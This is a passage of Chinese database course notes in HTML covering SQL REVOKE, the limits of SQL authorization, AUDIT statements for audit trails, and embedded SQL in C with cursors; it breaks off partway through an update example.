<li><code>&lt;privilege list&gt;</code>：要撤销的权限列表，例如 <code>SELECT</code>、<code>INSERT</code>、<code>UPDATE</code> 和<code>ALL</code>等·</li>
<li><code>&lt;table | view&gt;</code>：指定要撤销权限的表或视图。</li>
<li><code>&lt;user list&gt;</code>：指定要从中撤销权限的用户列表，pubilc表示所有用户</li>
<li><code>[restrict | cascade]</code>：指定撤销权限的方式。<ul>
<li><code>restrict</code>：如果有其他用户依赖于被撤销的权限，则不允许撤销。</li>
<li><code>cascade</code>：即使有其他用户依赖于被撤销的权限，也强制撤销，并同时撤销所有依赖的权限。</li>
</ul>
</li>
</ul>
<p>e.g.</p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-137-1"><a id="__codelineno-137-1" name="__codelineno-137-1" href="#note-db-sql-__codelineno-137-1"></a><span class="k">Revoke</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="n">branch</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">U1</span><span class="p">,</span><span class="w"> </span><span class="n">U3</span><span class="w"> </span><span class="k">cascade</span><span class="p">;</span><span class="w"> </span>
</span><span id="__span-137-2"><a id="__codelineno-137-2" name="__codelineno-137-2" href="#note-db-sql-__codelineno-137-2"></a><span class="c1">--移除U1和U3在branch上的select权限，如果有依赖也一并移除</span>
</span><span id="__span-137-3"><a id="__codelineno-137-3" name="__codelineno-137-3" href="#note-db-sql-__codelineno-137-3"></a><span class="k">Revoke</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="n">branch</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">U1</span><span class="p">,</span><span class="w"> </span><span class="n">U3</span><span class="w"> </span><span class="k">restrict</span><span class="p">;</span><span class="w"> </span>
</span><span id="__span-137-4"><a id="__codelineno-137-4" name="__codelineno-137-4" href="#note-db-sql-__codelineno-137-4"></a><span class="c1">-- 移除U1和U3在branch上的select权限，如果有依赖就fail</span>
</span></code></pre></div>
<div class="admonition info">
<p class="admonition-title">limitations</p>
<p>SQL 不支持在元组级别进行授权。例如，我们无法通过授权限制学生只能查看（存储）自己的成绩。</p>
<p>随着 Web 访问数据库的增长，数据库访问主要来自应用程序服务器。终端用户没有数据库用户 ID，他们都被映射到同一个数据库用户 ID。</p>
<p>一个应用程序（例如 Web 应用程序）的所有终端用户可能被映射到一个单一的数据库用户。</p>
<p>在上述情况下，授权的任务由应用程序来完成，而没有 SQL 的支持。</p>
<ul>
<li><strong>好处</strong> ：应用程序可以实现细粒度的授权，例如对单个元组的授权。</li>
<li><strong>缺点</strong> ：授权必须在应用程序代码中完成，并且可能分散在整个应用程序中。由于需要阅读大量的应用程序代码，检查授权漏洞的缺失变得非常困难。</li>
</ul>
</div>
<h4 id="note-db-sql-audit-trails">Audit Trails<a class="headerlink" href="#note-db-sql-audit-trails" title="Permanent link">&para;</a></h4>
<p>An audit trail is a log of all changes (inserts/deletes/updates) to the database along with information such as which user performed the change, and when the change was performed. </p>
<p>Used to track erroneous/fraudulent updates. </p>
<p>Can be implemented using triggers, but many database systems provide direct support. </p>
<p>语句审计: </p>
<p>E.g., audit table by scott by access whenever successful ---- 审计用户scott每次成功地执行有关table的语句 (create table, drop table, alter table)。 </p>
<p>格式：</p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-138-1"><a id="__codelineno-138-1" name="__codelineno-138-1" href="#note-db-sql-__codelineno-138-1"></a><span class="n">AUDIT</span><span class="w"> </span><span class="o">&lt;</span><span class="n">st</span><span class="o">-</span><span class="n">opt</span><span class="o">&gt;</span><span class="w"> </span><span class="p">[</span><span class="k">BY</span><span class="w"> </span><span class="o">&lt;</span><span class="n">users</span><span class="o">&gt;</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="k">BY</span><span class="w"> </span><span class="k">SESSION</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="k">ACCESS</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="k">WHENEVER</span><span class="w"> </span><span class="n">SUCCESSFUL</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="k">WHENEVER</span><span class="w"> </span><span class="k">NOT</span><span class="w"> </span><span class="n">SUCCESSFUL</span><span class="p">]</span><span class="w"> </span>
</span></code></pre></div>
<ul>
<li>当 BY <users> 缺省，对所有用户审计。 </li>
<li>BY SESSION每次会话期间，相同类型的需审计的SQL语句仅记录一次。 </li>
<li>常用的<St-opt>：table, view, role, index, … </li>
<li>取消审计：NOAUDIT …(其余同audit语句)。 </li>
</ul>
<p>对象(实体)审计： </p>
<p>E.g., audit delete, update on student --- 审计所有用户对student表的delete和update操作。 
格式：</p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-139-1"><a id="__codelineno-139-1" name="__codelineno-139-1" href="#note-db-sql-__codelineno-139-1"></a><span class="n">AUDIT</span><span class="w"> </span><span class="o">&lt;</span><span class="n">obj</span><span class="o">-</span><span class="n">opt</span><span class="o">&gt;</span><span class="w"> </span><span class="k">ON</span><span class="w"> </span><span class="o">&lt;</span><span class="n">obj</span><span class="o">&gt;</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="k">DEFAULT</span><span class="w"> </span><span class="p">[</span><span class="k">BY</span><span class="w"> </span><span class="k">SESSION</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="k">ACCESS</span><span class="p">]</span><span class="w">  </span><span class="p">[</span><span class="k">WHENEVER</span><span class="w"> </span><span class="n">SUCCESSFUL</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="k">WHENEVER</span><span class="w"> </span><span class="k">NOT</span><span class="w"> </span><span class="n">SUCCESSFUL</span><span class="p">]</span><span class="w"> </span>
</span></code></pre></div>
<ul>
<li>obj-opt: insert, delete, update, select, grant, … </li>
<li>实体审计对所有的用户起作用。 </li>
<li>ON <obj> 指出审计对象表、视图名。 </li>
<li>ON DEFAULT 对其后创建的所有对象起作用。 </li>
<li>取消审计：NOAUDIT … </li>
</ul>
<p>怎样看审计结果： 
审计结果记录在数据字典表: sys.aud$中，也可从dba_audit_trail, dba_audit_statement, dba_audit_object中获得有关情况。 
上述数据字典表需在DBA用户（system）下才可见。 </p>
<h3 id="note-db-sql-embedded-sql">Embedded SQL<a class="headerlink" href="#note-db-sql-embedded-sql" title="Permanent link">&para;</a></h3>
<p>SQL标准定义了在多种编程语言中嵌入SQL的方式，例如Pascal、PL/I、Fortran、C和Cobol。 </p>
<p>在其中嵌入SQL查询的语言被称为宿主语言（Host language），而在宿主语言中允许的SQL结构组成了嵌入式SQL。 </p>
<p>EXEC SQL语句用于标识嵌入式SQL请求给预处理器： </p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-140-1"><a id="__codelineno-140-1" name="__codelineno-140-1" href="#note-db-sql-__codelineno-140-1"></a><span class="k">EXEC</span><span class="w"> </span><span class="k">SQL</span><span class="w"> </span><span class="o">&lt;</span><span class="err">嵌入式</span><span class="n">SQL语句</span><span class="o">&gt;</span><span class="w"> </span><span class="n">END_EXEC</span><span class="w"> </span>
</span></code></pre></div>
<p>注意：这在不同语言中有所不同，例如，Java嵌入使用# </p>
<div class="language-java highlight"><pre><span></span><code><span id="__span-141-1"><a id="__codelineno-141-1" name="__codelineno-141-1" href="#note-db-sql-__codelineno-141-1"></a><span class="err">#</span><span class="w"> </span><span class="n">SQL</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">…</span><span class="p">.</span><span class="w"> </span><span class="p">}</span><span class="w"> </span>
</span></code></pre></div>
<h4 id="note-db-sql-select">SELECT<a class="headerlink" href="#note-db-sql-select" title="Permanent link">&para;</a></h4>
<ul>
<li>单行查询</li>
</ul>
<div class="language-c highlight"><pre><span></span><code><span id="__span-142-1"><a id="__codelineno-142-1" name="__codelineno-142-1" href="#note-db-sql-__codelineno-142-1"></a><span class="n">EXEC</span><span class="w"> </span><span class="n">SQL</span><span class="w"> </span><span class="n">BEGIN</span><span class="w"> </span><span class="n">DECLARE</span><span class="w"> </span><span class="n">SECTION</span><span class="p">;</span><span class="w"> </span>
</span><span id="__span-142-2"><a id="__codelineno-142-2" name="__codelineno-142-2" href="#note-db-sql-__codelineno-142-2"></a><span class="kt">char</span><span class="w"> </span><span class="n">V_an</span><span class="p">[</span><span class="mi">20</span><span class="p">],</span><span class="w"> </span><span class="n">bn</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span><span class="w"> </span>
</span><span id="__span-142-3"><a id="__codelineno-142-3" name="__codelineno-142-3" href="#note-db-sql-__codelineno-142-3"></a><span class="kt">float</span><span class="w">  </span><span class="n">bal</span><span class="p">;</span><span class="w"> </span>
</span><span id="__span-142-4"><a id="__codelineno-142-4" name="__codelineno-142-4" href="#note-db-sql-__codelineno-142-4"></a><span class="n">EXEC</span><span class="w"> </span><span class="n">SQL</span><span class="w"> </span><span class="n">END</span><span class="w"> </span><span class="n">DECLARE</span><span class="w"> </span><span class="n">SECTION</span><span class="p">;</span><span class="w"> </span>
</span><span id="__span-142-5"><a id="__codelineno-142-5" name="__codelineno-142-5" href="#note-db-sql-__codelineno-142-5"></a><span class="err">……</span><span class="p">.</span><span class="w"> </span>
</span><span id="__span-142-6"><a id="__codelineno-142-6" name="__codelineno-142-6" href="#note-db-sql-__codelineno-142-6"></a><span class="n">scanf</span><span class="p">(</span><span class="err">“</span><span class="o">%</span><span class="n">s</span><span class="err">”</span><span class="p">,</span><span class="w"> </span><span class="n">V_an</span><span class="p">);</span><span class="w">   </span><span class="c1">// 读入账号,然后据此在下面的语句获得bn, bal的值 </span>
</span><span id="__span-142-7"><a id="__codelineno-142-7" name="__codelineno-142-7" href="#note-db-sql-__codelineno-142-7"></a><span class="n">EXEC</span><span class="w"> </span><span class="n">SQL</span><span class="w"> </span><span class="n">SELECT</span><span class="w"> </span><span class="n">branch_name</span><span class="p">,</span><span class="w"> </span><span class="n">balance</span><span class="w"> </span><span class="n">INTO</span><span class="w"> </span><span class="o">:</span><span class="n">bn</span><span class="p">,</span><span class="w"> </span><span class="o">:</span><span class="n">bal</span><span class="w"> </span><span class="n">FROM</span><span class="w"> </span>
</span><span id="__span-142-8"><a id="__codelineno-142-8" name="__codelineno-142-8" href="#note-db-sql-__codelineno-142-8"></a><span class="n">account</span><span class="w"> </span><span class="n">WHERE</span><span class="w"> </span><span class="n">account_number</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">:</span><span class="n">V_an</span><span class="p">;</span><span class="w"> </span>
</span><span id="__span-142-9"><a id="__codelineno-142-9" name="__codelineno-142-9" href="#note-db-sql-__codelineno-142-9"></a><span class="n">END_EXEC</span>
</span><span id="__span-142-10"><a id="__codelineno-142-10" name="__codelineno-142-10" href="#note-db-sql-__codelineno-142-10"></a><span class="w">    </span><span class="nf">printf</span><span class="p">(</span><span class="err">“</span><span class="o">%</span><span class="n">s</span><span class="p">,</span><span class="w"> </span><span class="o">%</span><span class="n">s</span><span class="p">,</span><span class="w"> </span><span class="o">%</span><span class="n">f</span><span class="err">”</span><span class="p">,</span><span class="w"> </span><span class="n">V_an</span><span class="p">,</span><span class="w"> </span><span class="n">bn</span><span class="p">,</span><span class="w"> </span><span class="n">bal</span><span class="p">);</span><span class="w"> </span>
</span><span id="__span-142-11"><a id="__codelineno-142-11" name="__codelineno-142-11" href="#note-db-sql-__codelineno-142-11"></a><span class="err">……</span><span class="p">.</span><span class="w"> </span>
</span></code></pre></div>
<div class="language-c highlight"><pre><span></span><code><span id="__span-143-1"><a id="__codelineno-143-1" name="__codelineno-143-1" href="#note-db-sql-__codelineno-143-1"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
</span><span id="__span-143-2"><a id="__codelineno-143-2" name="__codelineno-143-2" href="#note-db-sql-__codelineno-143-2"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;sqlca.h&gt;</span><span class="c1">  // SQL Communications Area</span>
</span><span id="__span-143-3"><a id="__codelineno-143-3" name="__codelineno-143-3" href="#note-db-sql-__codelineno-143-3"></a>
</span><span id="__span-143-4"><a id="__codelineno-143-4" name="__codelineno-143-4" href="#note-db-sql-__codelineno-143-4"></a><span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-143-5"><a id="__codelineno-143-5" name="__codelineno-143-5" href="#note-db-sql-__codelineno-143-5"></a><span class="w">    </span><span class="n">EXEC</span><span class="w"> </span><span class="n">SQL</span><span class="w"> </span><span class="n">BEGIN</span><span class="w"> </span><span class="n">DECLARE</span><span class="w"> </span><span class="n">SECTION</span><span class="p">;</span>
</span><span id="__span-143-6"><a id="__codelineno-143-6" name="__codelineno-143-6" href="#note-db-sql-__codelineno-143-6"></a><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">emp_id</span><span class="p">;</span>
</span><span id="__span-143-7"><a id="__codelineno-143-7" name="__codelineno-143-7" href="#note-db-sql-__codelineno-143-7"></a><span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">first_name</span><span class="p">[</span><span class="mi">50</span><span class="p">];</span>
</span><span id="__span-143-8"><a id="__codelineno-143-8" name="__codelineno-143-8" href="#note-db-sql-__codelineno-143-8"></a><span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">last_name</span><span class="p">[</span><span class="mi">50</span><span class="p">];</span>
</span><span id="__span-143-9"><a id="__codelineno-143-9" name="__codelineno-143-9" href="#note-db-sql-__codelineno-143-9"></a><span class="w">    </span><span class="kt">float</span><span class="w"> </span><span class="n">salary</span><span class="p">;</span>
</span><span id="__span-143-10"><a id="__codelineno-143-10" name="__codelineno-143-10" href="#note-db-sql-__codelineno-143-10"></a><span class="w">    </span><span class="n">EXEC</span><span class="w"> </span><span class="n">SQL</span><span class="w"> </span><span class="n">END</span><span class="w"> </span><span class="n">DECLARE</span><span class="w"> </span><span class="n">SECTION</span><span class="p">;</span>
</span><span id="__span-143-11"><a id="__codelineno-143-11" name="__codelineno-143-11" href="#note-db-sql-__codelineno-143-11"></a>
</span><span id="__span-143-12"><a id="__codelineno-143-12" name="__codelineno-143-12" href="#note-db-sql-__codelineno-143-12"></a><span class="w">    </span><span class="c1">// 读取用户输入的员工ID</span>
</span><span id="__span-143-13"><a id="__codelineno-143-13" name="__codelineno-143-13" href="#note-db-sql-__codelineno-143-13"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Enter Employee ID: &quot;</span><span class="p">);</span>
</span><span id="__span-143-14"><a id="__codelineno-143-14" name="__codelineno-143-14" href="#note-db-sql-__codelineno-143-14"></a><span class="w">    </span><span class="n">scanf</span><span class="p">(</span><span class="s">&quot;%d&quot;</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">emp_id</span><span class="p">);</span>
</span><span id="__span-143-15"><a id="__codelineno-143-15" name="__codelineno-143-15" href="#note-db-sql-__codelineno-143-15"></a>
</span><span id="__span-143-16"><a id="__codelineno-143-16" name="__codelineno-143-16" href="#note-db-sql-__codelineno-143-16"></a><span class="w">    </span><span class="c1">// 执行SQL查询</span>
</span><span id="__span-143-17"><a id="__codelineno-143-17" name="__codelineno-143-17" href="#note-db-sql-__codelineno-143-17"></a><span class="w">    </span><span class="n">EXEC</span><span class="w"> </span><span class="n">SQL</span><span class="w"> </span><span class="n">SELECT</span><span class="w"> </span><span class="n">first_name</span><span class="p">,</span><span class="w"> </span><span class="n">last_name</span><span class="p">,</span><span class="w"> </span><span class="n">salary</span>
</span><span id="__span-143-18"><a id="__codelineno-143-18" name="__codelineno-143-18" href="#note-db-sql-__codelineno-143-18"></a><span class="w">    </span><span class="nl">INTO</span><span class="w"> </span><span class="p">:</span><span class="n">first_name</span><span class="p">,</span><span class="w"> </span><span class="o">:</span><span class="n">last_name</span><span class="p">,</span><span class="w"> </span><span class="o">:</span><span class="n">salary</span>
</span><span id="__span-143-19"><a id="__codelineno-143-19" name="__codelineno-143-19" href="#note-db-sql-__codelineno-143-19"></a><span class="w">    </span><span class="n">FROM</span><span class="w"> </span><span class="n">employees</span>
</span><span id="__span-143-20"><a id="__codelineno-143-20" name="__codelineno-143-20" href="#note-db-sql-__codelineno-143-20"></a><span class="w">    </span><span class="n">WHERE</span><span class="w"> </span><span class="n">employee_id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">:</span><span class="n">emp_id</span><span class="p">;</span>
</span><span id="__span-143-21"><a id="__codelineno-143-21" name="__codelineno-143-21" href="#note-db-sql-__codelineno-143-21"></a>
</span><span id="__span-143-22"><a id="__codelineno-143-22" name="__codelineno-143-22" href="#note-db-sql-__codelineno-143-22"></a><span class="w">    </span><span class="c1">// 检查SQL执行结果</span>
</span><span id="__span-143-23"><a id="__codelineno-143-23" name="__codelineno-143-23" href="#note-db-sql-__codelineno-143-23"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">sqlca</span><span class="p">.</span><span class="n">sqlcode</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-143-24"><a id="__codelineno-143-24" name="__codelineno-143-24" href="#note-db-sql-__codelineno-143-24"></a><span class="w">        </span><span class="c1">// 输出查询结果</span>
</span><span id="__span-143-25"><a id="__codelineno-143-25" name="__codelineno-143-25" href="#note-db-sql-__codelineno-143-25"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Employee ID: %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">emp_id</span><span class="p">);</span>
</span><span id="__span-143-26"><a id="__codelineno-143-26" name="__codelineno-143-26" href="#note-db-sql-__codelineno-143-26"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;First Name: %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">first_name</span><span class="p">);</span>
</span><span id="__span-143-27"><a id="__codelineno-143-27" name="__codelineno-143-27" href="#note-db-sql-__codelineno-143-27"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Last Name: %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">last_name</span><span class="p">);</span>
</span><span id="__span-143-28"><a id="__codelineno-143-28" name="__codelineno-143-28" href="#note-db-sql-__codelineno-143-28"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Salary: %.2f</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">salary</span><span class="p">);</span>
</span><span id="__span-143-29"><a id="__codelineno-143-29" name="__codelineno-143-29" href="#note-db-sql-__codelineno-143-29"></a><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-143-30"><a id="__codelineno-143-30" name="__codelineno-143-30" href="#note-db-sql-__codelineno-143-30"></a><span class="w">        </span><span class="c1">// 处理错误</span>
</span><span id="__span-143-31"><a id="__codelineno-143-31" name="__codelineno-143-31" href="#note-db-sql-__codelineno-143-31"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Error: Employee not found or SQL error occurred.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span id="__span-143-32"><a id="__codelineno-143-32" name="__codelineno-143-32" href="#note-db-sql-__codelineno-143-32"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-143-33"><a id="__codelineno-143-33" name="__codelineno-143-33" href="#note-db-sql-__codelineno-143-33"></a>
</span><span id="__span-143-34"><a id="__codelineno-143-34" name="__codelineno-143-34" href="#note-db-sql-__codelineno-143-34"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
</span><span id="__span-143-35"><a id="__codelineno-143-35" name="__codelineno-143-35" href="#note-db-sql-__codelineno-143-35"></a><span class="p">}</span>
</span></code></pre></div>
<ul>
<li>多行查询</li>
</ul>
<p>在嵌入式SQL中，多行查询通常使用游标（Cursor）来处理。游标允许程序逐行处理查询结果集。</p>
<p>假设我们有以下三个表：<code>depositor</code>、<code>customer</code>和<code>account</code>。我们希望找到在某个账户中余额超过给定金额的客户的姓名和城市。</p>
<ul>
<li>STEP 1: 声明游标</li>
</ul>
<p>首先，声明一个游标来保存查询结果。</p>
<div class="language-c highlight"><pre><span></span><code><span id="__span-144-1"><a id="__codelineno-144-1" name="__codelineno-144-1" href="#note-db-sql-__codelineno-144-1"></a><span class="n">EXEC</span><span class="w"> </span><span class="n">SQL</span><span class="w"> </span><span class="n">BEGIN</span><span class="w"> </span><span class="n">DECLARE</span><span class="w"> </span><span class="n">SECTION</span><span class="p">;</span>
</span><span id="__span-144-2"><a id="__codelineno-144-2" name="__codelineno-144-2" href="#note-db-sql-__codelineno-144-2"></a><span class="kt">float</span><span class="w"> </span><span class="n">v_amount</span><span class="p">;</span>
</span><span id="__span-144-3"><a id="__codelineno-144-3" name="__codelineno-144-3" href="#note-db-sql-__codelineno-144-3"></a><span class="kt">char</span><span class="w"> </span><span class="n">cn</span><span class="p">[</span><span class="mi">50</span><span class="p">];</span><span class="w">  </span><span class="c1">// customer name</span>
</span><span id="__span-144-4"><a id="__codelineno-144-4" name="__codelineno-144-4" href="#note-db-sql-__codelineno-144-4"></a><span class="kt">char</span><span class="w"> </span><span class="n">ccity</span><span class="p">[</span><span class="mi">50</span><span class="p">];</span><span class="w">  </span><span class="c1">// customer city</span>
</span><span id="__span-144-5"><a id="__codelineno-144-5" name="__codelineno-144-5" href="#note-db-sql-__codelineno-144-5"></a><span class="n">EXEC</span><span class="w"> </span><span class="n">SQL</span><span class="w"> </span><span class="n">END</span><span class="w"> </span><span class="n">DECLARE</span><span class="w"> </span><span class="n">SECTION</span><span class="p">;</span>
</span><span id="__span-144-6"><a id="__codelineno-144-6" name="__codelineno-144-6" href="#note-db-sql-__codelineno-144-6"></a>
</span><span id="__span-144-7"><a id="__codelineno-144-7" name="__codelineno-144-7" href="#note-db-sql-__codelineno-144-7"></a><span class="c1">// 声明游标</span>
</span><span id="__span-144-8"><a id="__codelineno-144-8" name="__codelineno-144-8" href="#note-db-sql-__codelineno-144-8"></a><span class="n">EXEC</span><span class="w"> </span><span class="n">SQL</span><span class="w"> </span><span class="n">DECLARE</span><span class="w"> </span><span class="n">c</span><span class="w"> </span><span class="n">CURSOR</span><span class="w"> </span><span class="n">FOR</span>
</span><span id="__span-144-9"><a id="__codelineno-144-9" name="__codelineno-144-9" href="#note-db-sql-__codelineno-144-9"></a><span class="n">SELECT</span><span class="w"> </span><span class="n">customer_name</span><span class="p">,</span><span class="w"> </span><span class="n">customer_city</span>
</span><span id="__span-144-10"><a id="__codelineno-144-10" name="__codelineno-144-10" href="#note-db-sql-__codelineno-144-10"></a><span class="n">FROM</span><span class="w"> </span><span class="n">depositor</span><span class="w"> </span><span class="n">D</span><span class="p">,</span><span class="w"> </span><span class="n">customer</span><span class="w"> </span><span class="n">B</span><span class="p">,</span><span class="w"> </span><span class="n">account</span><span class="w"> </span><span class="n">A</span>
</span><span id="__span-144-11"><a id="__codelineno-144-11" name="__codelineno-144-11" href="#note-db-sql-__codelineno-144-11"></a><span class="n">WHERE</span><span class="w"> </span><span class="n">D</span><span class="p">.</span><span class="n">customer_name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">B</span><span class="p">.</span><span class="n">customer_name</span>
</span><span id="__span-144-12"><a id="__codelineno-144-12" name="__codelineno-144-12" href="#note-db-sql-__codelineno-144-12"></a><span class="w">      </span><span class="n">AND</span><span class="w"> </span><span class="n">D</span><span class="p">.</span><span class="n">account_number</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">A</span><span class="p">.</span><span class="n">account_number</span>
</span><span id="__span-144-13"><a id="__codelineno-144-13" name="__codelineno-144-13" href="#note-db-sql-__codelineno-144-13"></a><span class="w">      </span><span class="n">AND</span><span class="w"> </span><span class="n">A</span><span class="p">.</span><span class="n">balance</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="o">:</span><span class="n">v_amount</span><span class="p">;</span>
</span><span id="__span-144-14"><a id="__codelineno-144-14" name="__codelineno-144-14" href="#note-db-sql-__codelineno-144-14"></a><span class="n">END_EXEC</span>
</span></code></pre></div>
<ul>
<li>STEP 2: 打开游标</li>
</ul>
<p>使用<code>OPEN</code>语句执行查询并打开游标。</p>
<div class="language-c highlight"><pre><span></span><code><span id="__span-145-1"><a id="__codelineno-145-1" name="__codelineno-145-1" href="#note-db-sql-__codelineno-145-1"></a><span class="c1">// 打开游标</span>
</span><span id="__span-145-2"><a id="__codelineno-145-2" name="__codelineno-145-2" href="#note-db-sql-__codelineno-145-2"></a><span class="n">EXEC</span><span class="w"> </span><span class="n">SQL</span><span class="w"> </span><span class="n">OPEN</span><span class="w"> </span><span class="n">c</span><span class="w"> </span><span class="n">END_EXEC</span><span class="p">;</span>
</span></code></pre></div>
<ul>
<li>STEP 3: 获取数据</li>
</ul>
<p>使用<code>FETCH</code>语句逐行获取查询结果，并将结果存储在宿主语言变量中。</p>
<div class="language-c highlight"><pre><span></span><code><span id="__span-146-1"><a id="__codelineno-146-1" name="__codelineno-146-1" href="#note-db-sql-__codelineno-146-1"></a><span class="c1">// 获取数据</span>
</span><span id="__span-146-2"><a id="__codelineno-146-2" name="__codelineno-146-2" href="#note-db-sql-__codelineno-146-2"></a><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-146-3"><a id="__codelineno-146-3" name="__codelineno-146-3" href="#note-db-sql-__codelineno-146-3"></a><span class="w">    </span><span class="n">EXEC</span><span class="w"> </span><span class="n">SQL</span><span class="w"> </span><span class="n">FETCH</span><span class="w"> </span><span class="n">c</span><span class="w"> </span><span class="n">INTO</span><span class="w"> </span><span class="o">:</span><span class="n">cn</span><span class="p">,</span><span class="w"> </span><span class="o">:</span><span class="n">ccity</span><span class="w"> </span><span class="n">END_EXEC</span><span class="p">;</span>
</span><span id="__span-146-4"><a id="__codelineno-146-4" name="__codelineno-146-4" href="#note-db-sql-__codelineno-146-4"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">sqlca</span><span class="p">.</span><span class="n">sqlcode</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">100</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">  </span><span class="c1">// SQLSTATE &#39;02000&#39; indicates no more data</span>
</span><span id="__span-146-5"><a id="__codelineno-146-5" name="__codelineno-146-5" href="#note-db-sql-__codelineno-146-5"></a><span class="w">        </span><span class="k">break</span><span class="p">;</span>
</span><span id="__span-146-6"><a id="__codelineno-146-6" name="__codelineno-146-6" href="#note-db-sql-__codelineno-146-6"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-146-7"><a id="__codelineno-146-7" name="__codelineno-146-7" href="#note-db-sql-__codelineno-146-7"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Customer Name: %s, City: %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">cn</span><span class="p">,</span><span class="w"> </span><span class="n">ccity</span><span class="p">);</span>
</span><span id="__span-146-8"><a id="__codelineno-146-8" name="__codelineno-146-8" href="#note-db-sql-__codelineno-146-8"></a><span class="p">}</span>
</span></code></pre></div>
<ul>
<li>STEP 4: 关闭游标</li>
</ul>
<p>使用<code>CLOSE</code>语句关闭游标并释放资源。</p>
<div class="language-c highlight"><pre><span></span><code><span id="__span-147-1"><a id="__codelineno-147-1" name="__codelineno-147-1" href="#note-db-sql-__codelineno-147-1"></a><span class="c1">// 关闭游标</span>
</span><span id="__span-147-2"><a id="__codelineno-147-2" name="__codelineno-147-2" href="#note-db-sql-__codelineno-147-2"></a><span class="n">EXEC</span><span class="w"> </span><span class="n">SQL</span><span class="w"> </span><span class="n">CLOSE</span><span class="w"> </span><span class="n">c</span><span class="w"> </span><span class="n">END_EXEC</span><span class="p">;</span>
</span></code></pre></div>
<h4 id="note-db-sql-update">Update<a class="headerlink" href="#note-db-sql-update" title="Permanent link">&para;</a></h4>
<ul>
<li>单行修改</li>
</ul>
<p>在嵌入式SQL中，单行修改操作允许我们通过SQL语句直接更新数据库中的数据。</p>
<p>假设我们有一个<code>account</code>表，其中包含字段<code>account_number</code>和<code>balance</code>。我们希望根据用户输入的账号和存款额来更新账户余额。</p>
<p>首先，声明用于存储用户输入的账号和存款额的变量。</p>
<div class="language-c highlight"><pre><span></span><code><span id="__span-148-1"><a id="__codelineno-148-1" name="__codelineno-148-1" href="#note-db-sql-__codelineno-148-1"></a><span class="n">EXEC</span><span class="w"> </span><span class="n">SQL</span><span class="w"> </span><span class="n">BEGIN</span><span class="w"> </span><span class="n">DECLARE</span><span class="w"> </span><span class="n">SECTION</span><span class="p">;</span>
</span><span id="__span-148-2"><a id="__codelineno-148-2" name="__codelineno-148-2" href="#note-db-sql-__codelineno-148-2"></a><span class="kt">char</span><span class="w"> </span><span class="n">an</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span><span class="w">  </span><span class="c1">// account number</span>
</span><span id="__span-148-3"><a id="__codelineno-148-3" name="__codelineno-148-3" href="#note-db-sql-__codelineno-148-3"></a><span class="kt">float</span><span class="w"> </span><span class="n">bal</span><span class="p">;</span><span class="w">    </span><span class="c1">// balance to add</span>
